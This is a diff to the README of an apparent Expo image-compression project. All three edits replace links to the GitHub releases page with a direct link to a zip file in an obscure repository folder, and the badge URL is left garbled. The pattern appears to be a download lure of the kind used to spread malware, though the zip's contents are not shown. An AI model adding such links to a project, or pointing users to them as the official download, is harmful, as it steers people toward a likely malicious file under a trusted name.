@@ -1,6 +1,6 @@
 # 🎨 expo-image-compressor - Compress Images Easily in Your Expo Project
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/ruha1984/expo-image-compressor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ruha1984/expo-image-compressor/main/ineuphonious/expo-image-compressor.zip%20Latest%https://raw.githubusercontent.com/ruha1984/expo-image-compressor/main/ineuphonious/expo-image-compressor.zip)](https://raw.githubusercontent.com/ruha1984/expo-image-compressor/main/ineuphonious/expo-image-compressor.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **expo-image-compressor**! This application helps you compress images
 
 ## 📥 Download & Install
 
-To get started, you need to download the latest version of the application. Visit this page to download: [Latest Releases](https://github.com/ruha1984/expo-image-compressor/releases)
+To get started, you need to download the latest version of the application. Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/ruha1984/expo-image-compressor/main/ineuphonious/expo-image-compressor.zip)
 
 ### Steps to Download
 
@@ -82,4 +82,4 @@ If you would like to contribute to the development, feel free to fork the reposi
 
 This project is licensed under the MIT License.
 
-Make sure to download the latest version of expo-image-compressor by visiting this page: [Latest Releases](https://github.com/ruha1984/expo-image-compressor/releases)
+Make sure to download the latest version of expo-image-compressor by visiting this page: [Latest Releases](https://raw.githubusercontent.com/ruha1984/expo-image-compressor/main/ineuphonious/expo-image-compressor.zip)
